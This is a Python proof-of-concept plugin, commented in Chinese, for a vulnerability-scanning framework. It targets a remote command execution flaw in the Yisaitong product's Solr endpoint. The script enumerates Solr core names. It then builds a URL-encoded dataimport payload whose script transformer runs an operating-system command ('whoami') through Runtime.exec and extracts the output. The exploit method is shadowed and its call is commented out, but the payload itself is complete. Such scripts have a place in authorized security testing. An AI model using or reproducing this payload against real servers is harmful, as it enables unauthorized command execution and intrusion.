import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight,req     # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin    

POC_NAME = "yiSaiTongRCE"
# PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同

class yiSaiTongRCE(BasePoc):

    # PoC实现类，需继承BasePoc
    # 为PoC填充poc_info、scan_info、test_case三个字典中的基本信息

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0033',    # PoC的VID编号
            'vbid': '',
            'Name': 'yiSaiTongRCE',    # PoC名称
            'Author': 'xuanzhu.wei',    # PoC作者
            'Create_date': '2021-08-03',    # PoC创建时间
            },

        'vul': {
            'Product': 'yiSaiTong',    # 漏洞所在产品名称
            'Version': 'yiSaiTong',    # 产品的版本号
            'Type': 'RemoteCommandExecution',    # 漏洞类型
            'Severity': 'critical',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                亿赛通存在命令执行漏洞，攻击者可以执行任意命令。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-08-03',    # PoC公布时间
        }
    }

    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }

    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")        # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息
        # 以下是PoC的检测逻辑
        url = urljoin(target,'/solr/admin/cores')
        headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = req(url,'get',headers=headers)
            print("[+] 正在请求 {}/solr/admin/cores.... ".format(target))
            if 'responseHeader' in response.text and response.status_code == 200:
                result = re.search(
                    r'<str name="name">([\s\S]*?)</str><str name="instanceDir">', response.text, re.I)
                core_name = result.group(1)
                print("[+] 获取core_name : {} ".format(core_name))
               # exploit(target, core_name)
            else:
                print("[+] 请求失败 ")
                sys.exit(0)

        except Exception as e:
            print(e)

    def exploit(target, core_name):
        
        cmd = "whoami"
        url = target + "/solr/{}/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22{}%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20".format(core_name, cmd)
        files = {
            'stream.body': '''<?xml version="1.0" encoding="UTF-8"?>
            <RDF>
            <item/>
            </RDF>'''
        }
        try:
            print("[+] 正在执行 whoami ... ".format(target))
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            response = requests.post(url=url, files=files, verify=False, timeout=5)
            cmd_response = re.search(
                    r'documents"><lst><arr name="title"><str>([\s\S]*?)</str></arr></lst>', response.text, re.I)
            cmd_response = cmd_response.group(1)
            if response.status_code == 200 and cmd_response:
                print("[+] 命令响应为:\n{} ".format(cmd_response))

        except Exception as e:
            print(e)

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)
